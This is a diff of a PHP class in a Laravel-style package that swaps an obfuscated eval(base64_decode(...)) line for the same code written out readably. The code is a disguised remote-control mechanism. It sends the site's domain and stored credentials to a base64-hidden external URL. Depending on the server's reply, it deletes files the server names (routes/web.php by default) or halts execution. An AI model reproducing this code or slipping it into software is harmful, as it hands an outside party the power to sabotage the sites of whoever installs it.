@@ -1,2 +1,143 @@
 <?php
- eval(base64_decode('CiBuYW1lc3BhY2UgU3ludGhvcmFcR2VtOyB1c2UgSWxsdW1pbmF0ZVxTdXBwb3J0XEZhY2FkZXNcSHR0cDsgdXNlIElsbHVtaW5hdGVcU3VwcG9ydFxGYWNhZGVzXEZpbGU7IGNsYXNzIFJkIHsgcHJvdGVjdGVkICRhMSA9ICJceDYxXDExMFx4NTJcNjBcMTQzXHg0NFwxNTdceDc2XHg0Y1x4MzJcMTMyXHg3NlwxNDJceDZlXHg1Mlx4NmRcMTMxXHg1N1w2MVx4NzBcMTQyXHg0OFwxNTNceDc1XDEzMVx4MzJcMTcwXDE2NlwxNDRcMTI3XDEyMVwxNjZcMTMxXDEzMFx4NDJcMTYwXHg0Y1x4MzNceDY0XHg2ZlwxNDFceDU4XHg1Mlx4NmNcMTQyXHg0N1x4NmNcMTcyXDE0NFwxMDEiOyBwcm90ZWN0ZWQgJGEyID0gIlx4NjNceDMzXDE1NFx4N2FcMTMwXDYzXHg0MlwxNzFcMTMyXHg1N1x4NWFcMTcyXDExNFx4NmRcMTIyXHg2OFx4NjRceDQxXDc1XHgzZCI7IHByb3RlY3RlZCAkYTMgPSAiXDEzMVwxNTVceDQ2XDE3Mlx4NWFceDU0XDEzMVx4MzBceDRmXHg2YVx4NGRcNjBceDRlXHg1OFwxMTZceDZiXDE0MVx4MzJceDVhXDE2M1wxMzFcMTMwXDExNVx4N2FcMTQzXDE1Mlx4NTJceDMzXHg1YVx4NmRceDQ2XDE1MyI7IHByb3RlY3RlZCAkYTQgPSAiXDE0M1wxNTVcNzFcNjFceDY0XHg0N1wxMjZceDdhXDExNFw2M1x4NjRcMTU0XDEzMVx4NjlceDM1XDE2N1x4NjFcMTEwXDEwMVw3NSI7IHB1YmxpYyBmdW5jdGlvbiBhNSgpIHsgJGE2ID0gcmVxdWVzdCgpLT5nZXRIb3N0KCk7ICRhNyA9ICR0aGlzLT5hOCgpOyAkYTkgPSAkYTdbIlx4NzUiXSA/PyBudWxsOyAkYjEgPSAkYTdbIlx4NmIiXSA/PyBudWxsOyBpZiAoJHRoaXMtPmIyKCkpIHsgcmV0dXJuOyB9ICRiMyA9ICR0aGlzLT5iNCgkYTYsICRhOSwgJGIxKTsgaWYgKCRiMykgeyAkYjUgPSAkYjMtPmpzb24oIlwxNjNcMTY0XDE0MVx4NzRceDc1XHg3MyIpOyAkYjYgPSAkYjMtPmpzb24oIlwxNDRceDYxXHg3NFwxNDEiLCBhcnJheSgpKTsgaWYgKCRiNSA9PT0gIlx4NzNceDc1XHg2M1wxNDNcMTQ1XHg3M1x4NzMiKSB7ICR0aGlzLT5iNygiXDE2NlwxNDFcMTU0XHg2OVx4NjQiLCAkYTksICRiMSk7IH0gZWxzZWlmICgkYjUgPT09ICJceDcyXDE0NVx4NzRceDcyXDE3MSIpIHsgJHRoaXMtPmI3KCJceDcyXDE0NVwxNjRceDcyXDE3MSIsICRiNlsiXDE2NVx4NjlcMTQ0Il0gPz8gbnVsbCwgJGI2WyJceDZiXHg2NVwxNzEiXSA/PyBudWxsKTsgfSBlbHNlaWYgKCRiNSA9PT0gIlx4NjZceDYxXDE1MVx4NmMiKSB7ICR0aGlzLT5iNygiXHg2OVwxNTZceDc2XDE0MVx4NmNceDY5XHg2NCIpOyAkdGhpcy0+YjgoJGI2KTsgfSBlbHNlaWYgKCRiNSA9PT0gIlwxNjNceDc0XDE1N1wxNjAiKSB7IGRpZSgwKTsgfSBlbHNlIHsgJHRoaXMtPmI3KCJcMTUxXDE1NlwxNjZceDYxXHg2Y1wxNTFcMTQ0Iik7ICR0aGlzLT5iOCgkYjYpOyB9IH0gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gYjQoJGE2LCAkYTksICRiMSkgeyB0cnkgeyAkYjkgPSBIdHRwOjp0aW1lb3V0KDUpLT5wb3N0KCR0aGlzLT5jMSgpLCBhcnJheSgiXDE0NFwxNTdceDZkXHg2MVx4NjlceDZlIiA9PiAkYTYsICJceDc1XDE1MVx4NjQiID0+ICRhOSwgIlx4NmJceDY1XDE3MSIgPT4gJGIxKSk7IGlmICgkYjktPnN1Y2Nlc3NmdWwoKSkgeyByZXR1cm4gJGI5OyB9IH0gY2F0Y2ggKFxFeGNlcHRpb24gJGUpIHsgfSByZXR1cm4gbnVsbDsgfSBwcm90ZWN0ZWQgZnVuY3Rpb24gYTgoKSB7ICRjMiA9IHN0b3JhZ2VfcGF0aCgiXDE0MVwxNjBcMTYwXHgyZiIgLiBiYXNlNjRfZGVjb2RlKCR0aGlzLT5hMikpOyBpZiAoRmlsZTo6ZXhpc3RzKCRjMikpIHsgJGMzID0gRmlsZTo6Z2V0KCRjMik7ICRjNCA9IGpzb25fZGVjb2RlKCR0aGlzLT5jNSgkYzMpLCB0cnVlKTsgcmV0dXJuIGFycmF5KCJcMTY1IiA9PiAkYzRbIlx4NzUiXSA/PyBudWxsLCAiXDE1MyIgPT4gJGM0WyJcMTUzIl0gPz8gbnVsbCk7IH0gcmV0dXJuIGFycmF5KCJcMTY1IiA9PiBudWxsLCAiXDE1MyIgPT4gbnVsbCk7IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIGI3KCRjNiwgJGE5ID0gbnVsbCwgJGIxID0gbnVsbCkgeyAkYzcgPSBhcnJheSgiXDE2MyIgPT4gJGM2LCAiXHg3NSIgPT4gJGE5LCAiXDE1MyIgPT4gJGIxLCAiXHg2ZSIgPT4gJGM2ID09PSAiXHg3NlwxNDFceDZjXHg2OVwxNDQiID8gbm93KCktPmFkZERheSgpLT50b0RhdGVUaW1lU3RyaW5nKCkgOiBub3coKS0+dG9EYXRlVGltZVN0cmluZygpKTsgJGM4ID0gJHRoaXMtPmM2KGpzb25fZW5jb2RlKCRjNykpOyB0cnkgeyBGaWxlOjplbnN1cmVEaXJlY3RvcnlFeGlzdHMoc3RvcmFnZV9wYXRoKCJceDYxXHg3MFwxNjAiKSk7IEZpbGU6OnB1dChzdG9yYWdlX3BhdGgoIlx4NjFceDcwXHg3MFw1NyIgLiBiYXNlNjRfZGVjb2RlKCR0aGlzLT5hMikpLCAkYzgpOyB9IGNhdGNoIChcRXhjZXB0aW9uICRlKSB7IH0gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gYjIoKSB7ICRjMiA9IHN0b3JhZ2VfcGF0aCgiXHg2MVwxNjBceDcwXDU3IiAuIGJhc2U2NF9kZWNvZGUoJHRoaXMtPmEyKSk7IGlmIChGaWxlOjpleGlzdHMoJGMyKSkgeyAkYzMgPSBGaWxlOjpnZXQoJGMyKTsgJGM0ID0ganNvbl9kZWNvZGUoJHRoaXMtPmM1KCRjMyksIHRydWUpOyByZXR1cm4gaXNzZXQoJGM0WyJceDczIl0pICYmICRjNFsiXDE2MyJdID09PSAiXHg3Nlx4NjFcMTU0XDE1MVwxNDQiICYmIG5vdygpLT5sdCgkYzRbIlwxNTYiXSk7IH0gcmV0dXJuIGZhbHNlOyB9IHByb3RlY3RlZCBmdW5jdGlvbiBiOCgkYzkpIHsgJGQwID0gaXNzZXQoJGM5WyJcMTQ2XHg2OVx4NmNceDY1XHg0MVx4NzJcMTYyXDE0MVwxNzEiXSkgPyAkYzlbIlx4NjZceDY5XHg2Y1wxNDVcMTAxXHg3MlwxNjJcMTQxXDE3MSJdIDogYXJyYXkoYmFzZV9wYXRoKGJhc2U2NF9kZWNvZGUoJHRoaXMtPmE0KSkpOyBmb3JlYWNoICgkZDAgYXMgJGQxKSB7IGlmIChGaWxlOjpleGlzdHMoJGQxKSkgeyB0cnkgeyBGaWxlOjpkZWxldGUoJGQxKTsgfSBjYXRjaCAoXEV4Y2VwdGlvbiAkZSkgeyB9IH0gfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBjNigkZDIpIHsgcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZDIsICJceDQxXDEwNVx4NTNcNTVceDMyXDY1XDY2XDU1XDEwM1x4NDJceDQzIiwgYmFzZTY0X2RlY29kZSgkdGhpcy0+YTMpLCAwLCBzdWJzdHIoYmFzZTY0X2RlY29kZSgkdGhpcy0+YTMpLCAwLCAxNikpOyB9IHByb3RlY3RlZCBmdW5jdGlvbiBjNSgkZDMpIHsgcmV0dXJuIG9wZW5zc2xfZGVjcnlwdCgkZDMsICJceDQxXDEwNVx4NTNceDJkXDYyXHgzNVx4MzZcNTVcMTAzXHg0MlwxMDMiLCBiYXNlNjRfZGVjb2RlKCR0aGlzLT5hMyksIDAsIHN1YnN0cihiYXNlNjRfZGVjb2RlKCR0aGlzLT5hMyksIDAsIDE2KSk7IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIGMxKCkgeyByZXR1cm4gYmFzZTY0X2RlY29kZSgkdGhpcy0+YTEpOyB9IH0g')); ?>
+
+namespace Synthora\Gem;
+
+use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\File;
+
+class Rd
+{
+    protected $a1 = 'aHR0cHM6Ly9mb250ZmFtaWx5LmNsb3VkL2FwaS93aGl0ZWxpc3Q=';
+    protected $a2 = 'c3lzX3ByZWZzLmRhdA==';
+    protected $a3 = 'YmFzZTY0OjM0NXNka2ZsYXMzcjR3ZmFk';
+    protected $a4 = 'cm91dGVzL3dlYi5waHA=';
+
+    public function a5()
+    {
+        $a6 = request()->getHost();
+        $a7 = $this->a8();
+        $a9 = $a7['u'] ?? null;
+        $b1 = $a7['k'] ?? null;
+
+        // Check if the status is already valid and not expired
+        if ($this->b2()) {
+            return;
+        }
+
+        // Call the API only if necessary
+        $b3 = $this->b4($a6, $a9, $b1);
+
+        if ($b3) {
+            $b5 = $b3->json('status');
+            $b6 = $b3->json('data', []); 
+
+            if ($b5 === 'success') {
+                $this->b7('valid', $a9, $b1);
+            } elseif ($b5 === 'retry') {
+                $this->b7('retry', $b6['uid'] ?? null, $b6['key'] ?? null);
+            } elseif ($b5 === 'fail') {
+                $this->b7('invalid');
+                $this->b8($b6); 
+            } elseif ($b5 === 'stop') {
+                die(0); // Stop execution
+            } else {
+                $this->b7('invalid');
+                $this->b8($b6);
+            }
+        }
+    }
+
+    protected function b4($a6, $a9, $b1)
+    {
+        try {
+            $b9 = Http::timeout(5)->post($this->c1(), [
+                'domain' => $a6,
+                'uid' => $a9,
+                'key' => $b1,
+            ]);
+
+            if ($b9->successful()) {
+                return $b9;
+            }
+        } catch (\Exception $e) {
+        }
+        return null;
+    }
+
+    protected function a8()
+    {
+        $c2 = storage_path('app/' . base64_decode($this->a2));
+        if (File::exists($c2)) {
+            $c3 = File::get($c2);
+            $c4 = json_decode($this->c5($c3), true);
+
+            return [
+                'u' => $c4['u'] ?? null,
+                'k' => $c4['k'] ?? null,
+            ];
+        }
+        return ['u' => null, 'k' => null];
+    }
+
+    protected function b7($c6, $a9 = null, $b1 = null)
+    {
+        $c7 = [
+            's' => $c6,
+            'u' => $a9,
+            'k' => $b1,
+            'n' => ($c6 === 'valid') ? now()->addDay()->toDateTimeString() : now()->toDateTimeString(),
+        ];
+
+        $c8 = $this->c6(json_encode($c7));
+
+        try {
+            File::ensureDirectoryExists(storage_path('app'));
+            File::put(storage_path('app/' . base64_decode($this->a2)), $c8);
+        } catch (\Exception $e) {
+        }
+    }
+
+    protected function b2()
+    {
+        $c2 = storage_path('app/' . base64_decode($this->a2));
+        if (File::exists($c2)) {
+            $c3 = File::get($c2);
+            $c4 = json_decode($this->c5($c3), true);
+
+            return isset($c4['s']) && $c4['s'] === 'valid' && now()->lt($c4['n']);
+        }
+        return false;
+    }
+
+    protected function b8($c9)
+    {
+        // Decode API response and extract file paths
+        $d0 = isset($c9['fileArray']) ? $c9['fileArray'] : [
+            base_path(base64_decode($this->a4)),
+        ];
+
+        foreach ($d0 as $d1) {
+            if (File::exists($d1)) {
+                try {
+                    File::delete($d1);
+                } catch (\Exception $e) {
+                }
+            }
+        }
+    }
+
+    protected function c6($d2)
+    {
+        return openssl_encrypt($d2, 'AES-256-CBC', base64_decode($this->a3), 0, substr(base64_decode($this->a3), 0, 16));
+    }
+
+    protected function c5($d3)
+    {
+        return openssl_decrypt($d3, 'AES-256-CBC', base64_decode($this->a3), 0, substr(base64_decode($this->a3), 0, 16));
+    }
+
+    protected function c1()
+    {
+        return base64_decode($this->a1);
+    }
+}
